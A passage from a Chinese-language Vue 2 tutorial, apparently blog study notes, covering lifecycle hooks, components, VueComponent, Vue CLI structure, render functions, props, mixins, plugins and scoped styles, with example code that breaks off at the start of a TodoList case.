        <h2>当前的n值是:{{n}}</h2>
        <button @click="add">点我n+1</button>
        </div>`, */
        data: {
            n: 1
        },
        methods: {
            add() {
                console.log('add')
                this.n += 1
            },
            bye() {
                // vm被销毁了，但是它的工作成果还在
                console.log('bye')
                this.$destroy()
            }
        },
        watch: {
            n() {
                console.log('n变了')
            }
        },
        beforeCreate() {
            // 初始化生命周期、事件，但数据代理还未开始。
            // 此时无法通过vm访问到data中的数据、methods中的方法
            console.log("beforeCreate")
        },
        created() {
            // 初始化数据监测、数据代理
            // 可以通过vm访问到data中的数据、methods中配置的方法。
            console.log("created")
            console.log(this)
        },
        beforeMount() {
            // 此阶段Vue开始解析模板，生成虚拟DOM(内存中)，页面还不能显示解析好的内容。
            // 页面呈现的是未经Vue编译的DOM结构。
            // 所有对DOM的操作，最终都不奏效（会被虚拟DOM挂载后覆盖）
            console.log('beforeMount')
            console.log(this)
        },
        mounted() {
            // 将虚拟DOM转为真实DOM插入页面
            // 页面中呈现的是经过Vue编译的DOM。
            // 对DOM的操作均有效（尽可能避免）。至此初始化过程结束，一般在此进行：开始定时器、发送网络请求、订阅消息、绑定自定义事件、等初始化操作。
            console.log('mounted')
            console.log(this)
            console.log(this.$el instanceof HTMLElement)    // true
            // debugger
        },
        beforeUpdate() {
            // 此时：数据是新的，但页面是旧的。即：页面尚未和数据保持同步。
            console.log("beforeUpdate")
            console.log(this.n)
        },
        updated() {
            // 根据新数据，生成新的虚拟DOM，随后与旧的虚拟DOM进行比较，最终完成页面更新，即：完成了Model->View的更新。
            // 此时数据是新的，页面也是新的
            console.log("updated")
            console.log(this.n)
        },
        beforeDestroy() {
            // 此时：vm中所有的：data、methods、指令等等，都处于可用状态，马上要执行销毁过程，一般在此阶段：关闭定时器、取消订阅消息、解绑自定义事件等收尾操作
            console.log('beforeDestroy')
            console.log(this.n) // 仍然可以获取到data、methods,但是所有对数据的修改都不会起到效果
        },
        destroyed() {
            console.log('destroyed')
        }
    })
</script>

</html>
```

### 生命周期总结

	常用的生命周期钩子：
			1.mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。
			2.beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。
	
	关于销毁Vue实例
			1.销毁后借助Vue开发者工具看不到任何信息。
			2.销毁后自定义事件会失效，但原生DOM事件依然有效。
			3.一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。

```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>总结生命周期</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <!-- 准备好一个容器 -->
    <div id="root">
        <h2 :style="{opacity}">欢迎学习Vue</h2>
        <button @click="opacity=1">透明度设置为1</button>
        <button @click="stop">点我停止变换</button>
    </div>

    <script type="text/javascript">
        Vue.config.productionTip = false
        new Vue({
            el: "#root",
            data: {
                opacity: 1
            },
            // 通过methods实现，无法实现。因为只要改了data中的数据，vue就会重新解析模板
            methods: {
                stop() {
                    this.$destroy()
                }
            },
            // Vue完成模板的解析并把初始的真实的DOM元素放入页面后（挂载完毕，只会执行一次）调用mounted
            mounted() {
                console.log('mounted')
                this.timer = setInterval(() => {
                    this.opacity -= 0.01
                    if (this.opacity <= 0) this.opacity = 1
                }, 16)
            },
            beforeDestroy() {
                console.log('vm挂了')
                clearInterval(this.timer)
            }
        })

    </script>
</body>

</html>
```

## 组件化图解
	模块
			1)理解: 向外提供特定功能的js程序, 一般就是一个js文件
			2)为什么:  js代码更多更复杂
			3)作用: 复用js, 简化js的编写, 提高js运行效率
	组件
			1)理解: 用来实现特定(局部)界面功能效果的代码集合(html/css/js/image)
			2)为什么: 一个界面的功能很复杂
			3)作用: 复用编码, 简化项目编码, 提高运行效率
	模块化
			当应用的js都以模块来编写的, 这个应用就是一个模块化的应用	
	组件化
			当应用是以多组件的方式实现, 这个应用就是一个组件化的应用, 应用的开发方式就是组件化的

![在这里插入图片描述](https://img-blog.csdnimg.cn/cd74cacdf488441cb2fc10f5b829865f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjE2Njkw,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/18af6833ffe14a6b8d51d79603113bc9.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjE2Njkw,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/2c618b6a89fd40a0bf4418da6349d4fc.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjE2Njkw,size_16,color_FFFFFF,t_70)
> 传统开发，若js文件之间相互依赖关系复杂，工程庞大，css与js文件过多。会导致依赖关系混乱，不好维护。同时，html结构代码还无法得到复用。

## 非单文件组件

      Vue中使用组件的三大步骤：
              一、定义组件(创建组件)
              二、注册组件
              三、使用组件(写组件标签)
    
      一、如何定义一个组件？
                  使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；
                  区别如下：
                          1.el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。
                          2.data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。
                  备注：使用template可以配置组件结构。
    
      二、如何注册组件？
                      1.局部注册：靠new Vue的时候传入components选项
                      2.全局注册：靠Vue.component('组件名',组件)
    
      三、编写组件标签：
                      <school></school>

```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>Document</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <!-- 准备好一个容器 -->
    <div id="root">
        <div>{{msg}}</div>
        <xuexiao></xuexiao>
        <hello></hello>
        <hr>
        <xuesheng></xuesheng>
        <xuesheng></xuesheng>
    </div>

    <script type="text/javascript">
        Vue.config.productionTip = false

        // 创建school组件
        const school = Vue.extend({
            template:`        
            <div>
                <h2>学校名称:{{schoolName}}</h2>
                <h2>学校地址:{{address}}</h2>
                <button @click="showName">点我提示学校名</button>
            </div>
            `,
            // el: "#root",  // 组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。
            // 组件中的data要写为函数形式，具体原因看底部代码
            data(){
                return{
                    schoolName: '尚硅谷',
                    address: '北京昌平',
                }
            },
            methods:{
                showName(){
                    alert(this.schoolName)
                }
            }
        })

        // 创建student组件
        const student = Vue.extend({
            template:`
            <div>
                <h2>学生名称:{{studentName}}</h2>
                <h2>学生年龄:{{age}}</h2>
            </div>
            `,
            data(){
                return{
                    studentName: '张三',
                    age: 18
                }
            }
        })

        // 第一步：创建hello组件
        const hello = Vue.extend({
            template:`
                <div>
                    <h2>你好啊!</h2>    
                </div>
            `,
        })

        // 第二步：全局注册组件
        Vue.component('hello',hello)

        // 创建vm
        new Vue({
            el: "#root",
            data:{
                msg:'你好啊'
            },
            // 第二步：注册组件（局部注册）
            components:{
                xuexiao:school,
                xuesheng:student
            }
        })

        /*         function data() {
                    return {
                        a: 1,
                        b: 2
                    }
                }
        
                // 此时，如果修改x1中的a，x2不会受到影响。而若data为对象，则x1改变，x2会受到影响。
                const x1 = data()
                const x2 = data() */
    </script>
</body>

</html>
```


## 非单文件组件注意点

      几个注意点：
              1.关于组件名:
                          一个单词组成：
                                      第一种写法(首字母小写)：school
                                      第二种写法(首字母大写)：School
                          多个单词组成：
                                      第一种写法(kebab-case命名)：my-school
                                      第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)
                          备注：
                                  (1).组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。
                                  (2).可以使用name配置项指定组件在开发者工具中呈现的名字。
    
              2.关于组件标签:
                          第一种写法：<school></school>
                          第二种写法：<school/>
                          备注：不用使用脚手架时，<school/>会导致后续组件不能渲染。
    
              3.一个简写方式：
                          const school = Vue.extend(options) 可简写为：const school = options。但底层还是会执行一次Vue.extend

```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>几个注意点</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <div id="root">
        <h1>{{msg}}</h1>
        <my-school></my-school>
        <my-school />
    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false

    // 定义组件
    /*     const s = Vue.extend({
            name: 'xxc',
            template: `
                <div>
                    <h2>学校名称：{{name}}</h2>    
                    <h2>学校地址：{{address}}</h2>    
                </div>
            `,
            data() {
                return {
                    name: '尚硅谷',
                    address: '北京'
                }
            }
        }) */


    const s = {
        name: 'xxc',
        template: `
            <div>
                <h2>学校名称：{{name}}</h2>    
                <h2>学校地址：{{address}}</h2>    
            </div>
        `,
        data() {
            return {
                name: '尚硅谷',
                address: '北京'
            }
        }
    }

    new Vue({
        el: "#root",
        data: {
            msg: "欢迎学习Vue!"
        },
        components: {
            // School: s
            'my-school': s
            // MySchool: s
        }
    })
</script>

</html>
```

## 组件的嵌套
```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>Document</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <!-- 准备好一个容器 -->
    <div id="root">

    </div>

    <script type="text/javascript">
        Vue.config.productionTip = false

        // 定义student组件
        const student = {
            name: 'student',
            template: `
                <div>
                    <h2>学生姓名：{{name}}</h2>    
                    <h2>学生年龄：{{age}}</h2>    
                </div>
            `,
            data() {
                return {
                    name: 'xxc',
                    age: '20'
                }
            }
        }


        // 定义school组件
        const school = {
            name: 'school',
            template: `
                <div>
                    <h2>学校名称：{{name}}</h2>    
                    <h2>学校地址：{{address}}</h2>  
                    <student></student>  
                </div>
            `,
            data() {
                return {
                    name: '尚硅谷',
                    address: '北京'
                }
            },
            // 注册组件（局部）
            components: {
                student
            }
        }

        // 定义hello组件
        const hello = Vue.extend({
            template: `<h1>{{msg}}</h1>`,
            data() {
                return {
                    msg: "欢迎"
                }
            }
        })

        // 定义app组件
        const app = Vue.extend({
            template: `
            <div>
                <hello></hello>
                <school></school>    
            </div>
            `,
            components: {
                school,
                hello
            }
        })

        // 创建vm
        new Vue({
            template: `<app></app>`,
            el: "#root",
            // 注册组件（局部）
            components: {
                app
            }
        })
    </script>
</body>

</html>
```

## VueComponent

     关于VueComponent：
          1.school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。
    
          2.我们只需要写<school/>或<school></school>，Vue解析时会帮我们创建school组件的实例对象，
              即Vue帮我们执行的：new VueComponent(options)。
    
          3.特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！
    
          4.关于this指向：
                  (1).组件配置中：
                              data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。
                  (2).new Vue(options)配置中：
                              data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。
    
          5.VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。
              Vue的实例对象，以后简称vm。

```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>4.VueComponent</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <!-- 准备好一个容器 -->
    <div id="root">
        <school></school>
        <hello></hello>
    </div>

    <script type="text/javascript">
        Vue.config.productionTip = false

        // 定义school组件
        const school = Vue.extend({
            name: 'school',
            template: `
                <div>
                    <h2>学校名称：{{name}}</h2>    
                    <h2>学校地址：{{address}}</h2>  
                    <button @click="showName">点我提示学校名</button>
                </div>
            `,
            data() {
                return {
                    name: '尚硅谷',
                    address: '北京'
                }
            },
            methods: {
                showName() {
                    // alert(this)
                    console.log(this)
                }
            }
        })

        const test = Vue.extend({
            template: `<span>atguigu</span>`
        })

        // 定义hello组件
        const hello = Vue.extend({
            template: `
            <div>
                <h2>{{msg}}</h2>
                <test></test>
            </div>
            `,
            data() {
                return {
                    msg: '你好啊!'
                }
            },
            components: { test }
        })

        console.log('@', school)
        console.log('#', hello)
        console.log(school === hello)   //false

        // 创建vm
        const vm = new Vue({
            el: '#root',
            components: { school, hello }
        })
    </script>
</body>

</html>
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/3404413f469749cb87e84926658329f0.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/b359c842645b40acb01b2de1fa966a92.png)
>vc与vm并不完全相同，如：vc中不可以写el，且vc中的data必须是函数形式的。

## 一个重要的关系

       1.一个重要的内置关系：VueComponent.prototype.__proto__ === Vue.prototype
       2.为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。

```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>5.一个重要的内置关系</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <!-- 准备好一个容器 -->
    <div id="root">
        <school></school>
    </div>

    <script type="text/javascript">
        Vue.config.productionTip = false
        Vue.prototype.x = 99
        // 定义school组件
        const school = Vue.extend({
            name: 'school',
            template: `
                <div>
                    <h2>学校名称：{{name}}</h2>    
                    <h2>学校地址：{{address}}</h2>  
                    <button @click="showX">点我输出x</button>
                </div>
            `,
            data() {
                return {
                    name: '尚硅谷',
                    address: '北京'
                }
            },
            methods: {
                showX() {
                    console.log(this.x)
                }
            }
        })

        // 创建一个vm
        new Vue({
            el: '#root',
            data: {
                msg: '你好'
            },
            components: { school }
        })

        console.log(school.prototype.__proto__ === Vue.prototype)

        /* // 定义一个构造函数
        function Demo() {
            this.a = 1
            this.b = 2
        }
        // 创建一个Demo的实例对象
        const d = new Demo()

        console.log(Demo.prototype) // 显式原型属性
        console.log(d.__proto__)    // 隐式原型属性

        // 程序员通过显示原型属性操作原型对象，追加一个x属性，值为99
        Demo.prototype.x = 99

        console.log('@', d) */

    </script>
</body>

</html>
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/babc73f6c995413b9dc93188c8933e59.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjE2Njkw,size_16,color_FFFFFF,t_70)


## 单文件组件
-  Student.vue
```vue
<template>
	<div>
		<h2>学生姓名：{{ name }}</h2>
		<h2>学生年龄：{{ age }}</h2>
	</div>
</template>

<script>
export default {
	// 此处的姓名最好跟文件名保持一致。
	name: "Student",
	data() {
		return {
			name: "张三",
			age: 18,
		};
	},
};
</script>

```

-  School.vue
```vue
<template>
	<div class="demo">
		<h2>学校名称：{{ name }}</h2>
		<h2>学校地址：{{ address }}</h2>
		<button @click="showName">点我提示学校名</button>
	</div>
</template>

<script>
export default {
	// 此处的姓名最好跟文件名保持一致。
	name: "School",
	data() {
		return {
			name: "尚硅谷",
			address: "北京昌平",
		};
	},
	methods: {
		showName() {
			alert(this.name);
		},
	},
};
</script>

<style>
.demo {
	background-color: orange;
}
</style>
```

- App.vue
```vue
<template>
	<div>
		<School></School>
		<Student></Student>
	</div>
</template>

<script>
// 引入组件
import School from "./School.vue";
import Student from "./Student.vue";

export default {
	name: "App",
	components: {
		School,
		Student,
	},
};
</script>

<style>
</style>

```

- main.js
```js
import App from './App.vue'

new Vue({
    el: '#root',
    template: `<App></App>`,
    components: {
        App
    }
})
```

- index.html
```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>练习一下单文件组件的语法</title>
</head>

<body>
    <!-- 准备一个容器 -->
    <div id="root">
    </div>
    <script type="text/javascript" src="../js/vue.js"></script>
    <script type="text/javascript" src="./main.js"></script>
</body>

</html>
```

## Vue脚手架入门（VueCli）
> CLI :command line interface

### 分析脚手架结构
![在这里插入图片描述](https://img-blog.csdnimg.cn/03a5103aee27426aa0dd39b0992db4fe.png)
- package.json  -> 包的说明书
![在这里插入图片描述](https://img-blog.csdnimg.cn/528f91ebefe24606952b1f928d61e070.png)
build：构建（最后一次编译）
lint：语法检查

- package-lock.json ->包版本控制文件（锁定版本）

- README.md -> 项目说明文件

- src文件夹中
1. -- main.js  一切的开端
```js
// 该文件是整个项目的入口文件

// 引入Vue
import Vue from 'vue'
// 引入App组件，它是所有组件的父组件
import App from './App.vue'

// 关闭Vue的生产提示
Vue.config.productionTip = false

// 创建Vue实例对象 --- vm
new Vue({
  // 下面这行代码完成了将App组件放入容器中
  render: h => h(App),
}).$mount('#app')

```
2. App.vue（一人之下，万人之上）
```html
<template>
  <div id="app">
    <img alt="Vue logo" src="./assets/logo.png">
    <HelloWorld msg="Welcome to Your Vue.js App"/>
  </div>
</template>

<script>
import HelloWorld from './components/HelloWorld.vue'

export default {
  name: 'App',
  components: {
    HelloWorld
  }
}
</script>

<style>
#app {
  font-family: Avenir, Helvetica, Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  text-align: center;
  color: #2c3e50;
  margin-top: 60px;
}
</style>

```
3. asstes -> 放置静态资源
4. components->放置单文件组件

- public文件夹中
1. index.html
```html
<!DOCTYPE html>
<html lang="">

<head>
  <meta charset="utf-8">
  <!-- 针对IE浏览器的一个特殊配置，含义是让IE浏览器以最高的渲染页面 -->
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <!-- 开启移动端的理想视口 -->
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <!-- 配置页签的图标，<%= BASE_URL %>代表./ -->
  <link rel="icon" href="<%= BASE_URL %>favicon.ico">
  <!-- 配置网页标题 -->
  <title>
    <%= htmlWebpackPlugin.options.title %>
  </title>
</head>

<body>
  <!-- 如果浏览器不支持js时，noscript标签中的元素就会被渲染 -->
  <noscript>
    <strong>We're sorry but <%= htmlWebpackPlugin.options.title %> doesn't work properly without JavaScript enabled.
        Please enable it to continue.</strong>
  </noscript>

  <!-- 容器 -->
  <div id="app"></div>
  <!-- built files will be auto injected -->
</body>

</html>
```

 ### render函数
	1. vue.js与vue.runtime.xxx.js的区别：
	    1. vue.js是完整版的Vue，包含：核心功能 + 模板解析器。
	    2. vue.runtime.xxx.js是运行版的Vue，只包含：核心功能；没有模板解析器。
	2. 因为vue.runtime.xxx.js没有模板解析器，所以不能使用template这个配置项，需要使用render函数接收到的createElement函数去指定具体内容。
	 - 使用一般模板渲染写法

```js
// 该文件是整个项目的入口文件

// 引入Vue
import Vue from 'vue'
// 引入App组件，它是所有组件的父组件
import App from './App.vue'
// 关闭Vue的生产提示
Vue.config.productionTip = false

// 创建Vue实例对象 --- vm
new Vue({
  // 下面这行代码完成了将App组件放入容器中
  el: '#app',
  template: `<App></App>`,
  components: { App },
})

```

>产生如下错误：提示请引入完整版vue或使用render函数进行渲染
![在这里插入图片描述](https://img-blog.csdnimg.cn/32ea9ae5107d4ce7a56d6a84a229df72.png)

>在脚手架的main.js文件中导入的vue，默认是不完整的vue
>![在这里插入图片描述](https://img-blog.csdnimg.cn/1f3f37c1c5df4cc797d3144cd868db5e.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjE2Njkw,size_16,color_FFFFFF,t_70)
此处的vue只有vue核心而没有vue模板解析器。故需要使用render函数来进行解析。而其余的组件中的template则由vue-template-complier来进行解析。
![在这里插入图片描述](https://img-blog.csdnimg.cn/04924b3feebd40a28afe87eafd2a1396.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjE2Njkw,size_16,color_FFFFFF,t_70)

>vue中分成多种不同类型vue的作用：最终项目打包好后，并不需要模板解析器，故只需要引入残缺版的vue即可。模板解析器占整个库1/3，故应该尽可能不参与打包。


- 使用render函数写法
```js
// 该文件是整个项目的入口文件

// 引入Vue
import Vue from 'vue'
// 引入App组件，它是所有组件的父组件
import App from './App.vue'
// 关闭Vue的生产提示
Vue.config.productionTip = false

// 创建Vue实例对象 --- vm
new Vue({
  // 下面这行代码完成了将App组件放入容器中
  el: '#app',
  // render参数为createElement，即创建模板的函数。若函数参数为组件，则只需要传一个参数即可
  // render(createElement) {
  //   return createElement('h1', '你好啊')
  // }
  render: h => h(App),
})

```

### 修改默认配置

	1. 使用vue inspect > output.js可以查看到Vue脚手架的默认配置。
	2. 使用vue.config.js可以对脚手架进行个性化定制，详情见：https://cli.vuejs.org/zh

可允许修改的配置项可到vue-cli官网的配置参考选项中查看
![在这里插入图片描述](https://img-blog.csdnimg.cn/e5bd7135bd5945bb984817ca29db3d59.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjE2Njkw,size_16,color_FFFFFF,t_70)
> 注意：平时所写的Vue.config.productionTip = false。中的Vue.config与修改脚手架配置的vue.config.js不是一个东西。一个是调整Vue工作时的配置，一个是调整脚手架工作时的配置。


- vue.config.js
```js
module.exports = {
    pages: {
        index: {
            // 入口
            entry: 'src/peiqi.js'
        }
    },
    lintOnSave:false // 关闭语法检查
}
```
> 注意：此文件中要么别写，要写就写完整，不可以写成index:{}。否则会报错。

###  ref属性
1. 被用来给元素或子组件注册引用信息（id的替代者）
2. 应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象（vc）。若使用id来获得组件实例，会获取到其组件的html结构，而通过ref会得到VueComponent对象。
3. 使用方式：
    1. 打标识：```<h1 ref="xxx">.....</h1>```或 ```<School ref="xxx"></School>```
    2. 获取：```this.$refs.xxx```

```html
<template>
	<div>
		<h1 v-text="msg" ref="title"></h1>
		<button ref="btn" @click="showDOM">点我输出上方的DOM元素</button>
		<School ref="sch" id="sch" />
	</div>
</template>

<script>
import School from "./components/School.vue";
export default {
	name: "App",
	components: { School },
	data() {
		return {
			msg: "欢迎学习vue",
		};
	},
	methods: {
		showDOM() {
			console.log(this.$refs.title); // 真实DOM元素
			console.log(this.$refs.btn); // 真实DOM元素
			console.log(this.$refs.sch); // School组件的实例对象
			console.log(document.getElementById("sch")); // School组件的所有html结构
		},
	},
};
</script>

```

### props属性
1. 功能：让组件接收外部传过来的数据

2. 传递数据：```<Demo name="xxx"/>```

3. 接收数据：

    1. 第一种方式（只接收）：```props:['name'] ```

    2. 第二种方式（限制类型）：```props:{name:String}```

    3. 第三种方式（限制类型、限制必要性、指定默认值）：

        ```js
        props:{
        	name:{
        	type:String, //类型
        	required:true, //必要性，通常required和default不会同时出现
        	default:'老王' //默认值
        	}
        }
        ```

    > 备注：props是只读的，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中的数据。
- Student.vue
```html
<template>
	<div>
		<h1>{{ msg }}</h1>
		<h2>学生姓名：{{ name }}</h2>
		<h2>学生性别：{{ sex }}</h2>
		<h2>学生年龄：{{ myAge }}</h2>
		<!-- 虽然可以修改，但props中的值最好不要修改，控制台会警告 -->
		<button @click="updateAge">尝试修改收到的年龄</button>
	</div>
</template>

<script>
export default {
	name: "Student",
	data() {
		console.log(this);
		return {
			msg: "XXC",
			myAge: this.age,
		};
	},
	methods: {
		updateAge() {
			this.myAge = 22;
		},
	},

	// 顺序不必一一对应。props中的数据会和data中的数据一样被代理到组件对象实例身上
	// 若data中的值与props中的值冲突，以props中的值为准。因为props中的值比data的值更早生成
	//简单声明接收
	props: ["name", "sex", "age"],
	// props: ["name", "sex", "age", "phone"], // 若声明的值未传，为undefined

	// 接收的同时对数据进行类型限制
	/* props: {
		name: String,
		age: Number,
		sex: String,
	}, */

	// 接收的同时对数据：进行类型限制+默认值的指定+必要性的限制
	/* props: {
		name: {
			type: String, // name的类型是字符串
			required: true, // name是必要的
		},
		age: {
			type: Number,
			default: 99, // 默认值
		},
		sex: {
			type: String,
			required: true,
		},
	}, */
};
</script>


```

- App.vue

```html
<template>
	<div>
		<!-- 此处age与:age不同。:age可以得到等号右边表达式的返回值并传给子组件。而age只能将等号右边的字符串传给子组件。且要注意以下形式传参等号右边只能写"内容" -->
		<!-- 传给props的参数名不能是ref、key等已被定义的参数名 -->

		<Student name="李四" sex="女" :age="18" />
	</div>
</template>

<script>
import Student from "./components/Student.vue";
export default {
	name: "App",
	components: { Student },
};
</script>

```

### mixins（混入）
1. 功能：可以把多个组件共用的配置提取成一个混入对象

2. 使用方式：

    第一步定义混合：

    ```
    {
        data(){....},
        methods:{....}
        ....
    }
    ```

    第二步使用混入：

    ​	全局混入（在main.js中配置）：```Vue.mixin(xxx)```
    ​	局部混入（在要引入的组件中配置）：```mixins:['xxx']	```

- mixin.js
```js
export const hunhe = {
    methods: {
        showName() {
            alert(this.name);
        },
    },
    mounted() {
        console.log('你好啊')
    }
}

export const hunhe2 = {
    data() {
        return {
            x: 100,
            y: 200
        }
    }
}


```

- main.js
```js
import Vue from 'vue'
import App from './App.vue'
Vue.config.productionTip = false

// 全局混合
// import { hunhe, hunhe2 } from './mixin'

// Vue.mixin(hunhe)
// Vue.mixin(hunhe2)

// 创建vm
new Vue({
    el: '#app',
    render: h => h(App)
})
```

- Student.vue
```html
<template>
	<div>
		<h2 @click="showName">学生姓名：{{ name }}</h2>
		<h2>学生性别：{{ sex }}</h2>
	</div>
</template>

<script>
// 引入一个混合
import { hunhe, hunhe2 } from "../mixin";
export default {
	name: "Student",
	data() {
		return {
			name: "XXC",
			sex: "男",
		};
	},
	mixins: [hunhe, hunhe2],
};
</script>

```
- School.vue
```html
<template>
	<div>
		<h2 @click="showName">学校名称：{{ name }}</h2>
		<h2>学校地址：{{ address }}</h2>
	</div>
</template>

<script>
import { hunhe, hunhe2 } from "../mixin";
export default {
	name: "School",
	data() {
		return {
			name: "尚硅谷",
			address: "北京",
			x: 666, // 混合（mixins）中的配置项会和组件的配置项叠加，但若有冲突，以组件中的为主。同时若有console.log之类的不会有影响的。则都要
		};
	},
	mixins: [hunhe, hunhe2],
	mounted() {
		console.log("你好啊！！！！！");
	},
};
</script>

```

### 插件
1. 功能：用于增强Vue

2. 本质：包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据。

3. 定义插件：

    ```js
    对象.install = function (Vue, options) {
        // 1. 添加全局过滤器
        Vue.filter(....)
    
        // 2. 添加全局指令
        Vue.directive(....)
    
        // 3. 配置全局混入(合)
        Vue.mixin(....)
    
        // 4. 添加实例方法
        Vue.prototype.$myMethod = function () {...}
        Vue.prototype.$myProperty = xxxx
    }
    ```

4. 使用插件：```Vue.use()```

- plugin.js
```js
export default {
    install(Vue, x, y, z) {
        console.log(x, y, z)
        //全局过滤器
        Vue.filter('mySlice', function (value) {
            return value.slice(0, 4)
        })

        //定义全局指令
        Vue.directive('fbind', {
            //指令与元素成功绑定时（一上来）
            bind(element, binding) {
                element.value = binding.value
            },
            //指令所在元素被插入页面时
            inserted(element, binding) {
                element.focus()
            },
            //指令所在的模板被重新解析时
            update(element, binding) {
                element.value = binding.value
            }
        })

        //定义混入
        Vue.mixin({
            data() {
                return {
                    x: 100,
                    y: 200
                }
            },
        })

        //给Vue原型上添加一个方法（vm和vc就都能用了）
        Vue.prototype.hello = () => { alert('你好啊') }
    }
}
```

- main.js
```js
// 引入Vue
import Vue from 'vue'
// 引入App
import App from './App.vue'
// 引入插件
import plugins from './plugins'
// 关闭Vue的生产提示
Vue.config.productionTip = false

// 应用、使用插件
Vue.use(plugins, 1, 2, 3)

// 创建vm
new Vue({
    el: '#app',
    render: h => h(App)
})
```

- School.vue
```html
<template>
	<div>
		<h2>学校名称：{{ name | mySlice }}</h2>
		<h2>学校地址：{{ address }}</h2>
		<button @click="test">点我测试一个hello方法</button></button>
	</div>
</template>

<script>
export default {
	name: "School",
	data() {
		return {
			name: "尚硅谷atguigu",
			address: "北京",
		};
	},
	methods: {
		test() {
			this.hello();
		},
	},
};
</script>

```

- Student.vue
```html
<template>
	<div>
		<h2>学生姓名：{{ name }}</h2>
		<h2>学生性别：{{ sex }}</h2>
		<input type="text" v-fbind:value="name" />
	</div>
</template>

<script>
export default {
	name: "Student",
	data() {
		return {
			name: "XXC",
			sex: "男",
		};
	},
};
</script>

```

### scoped与lang
1. scoped作用：让样式在局部生效，防止冲突。
2. 写法：```<style scoped>```
3. lang作用：指定样式的书写格式

>补充：由于vue脚手架使用的是4的webpack，所以less-loader需要安装7版本。否则会报错
>查看包版本的语句：npm view less-loader versions

## TodoList案例
1. 组件化编码流程：

    ​	(1).拆分静态组件：组件要按照功能点拆分，命名不要与html元素冲突。

    ​	(2).实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用：

    ​			1).一个组件在用：放在组件自身即可。

    ​			2). 一些组件在用：放在他们共同的父组件上（<span style="color:red">状态提升</span>）。

    ​	(3).实现交互：从绑定事件开始。

2. props适用于：

    ​	(1).父组件 ==> 子组件 通信

    ​	(2).子组件 ==> 父组件 通信（要求父先给子一个函数）

3. 使用v-model时要切记：v-model绑定的值不能是props传过来的值，因为props是不可以修改的！

4. props传过来的若是对象类型的值，修改对象中的属性时Vue不会报错，但不推荐这样做。

- App.vue
```html
<template>
	<div class="todo-container">
		<div class="todo-wrap">
			<MyHeader :addTodo="addTodo"></MyHeader>
			<MyList
				:todos="todos"
				:checkTodo="checkTodo"
				:deleteTodo="deleteTodo"
			></MyList>
			<MyFooter
				:todos="todos"
